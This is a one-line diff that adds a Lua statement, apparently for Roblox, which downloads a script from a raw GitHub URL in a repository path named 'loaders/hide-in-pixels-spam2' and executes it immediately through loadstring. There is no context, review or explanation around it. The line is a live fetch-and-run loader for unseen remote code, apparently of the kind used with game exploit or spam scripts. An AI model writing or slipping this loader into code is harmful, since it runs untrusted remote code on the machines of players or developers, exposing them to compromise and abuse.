@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/hide-in-pixels-spam2-ome0ksvym0ctzm.lua"))()
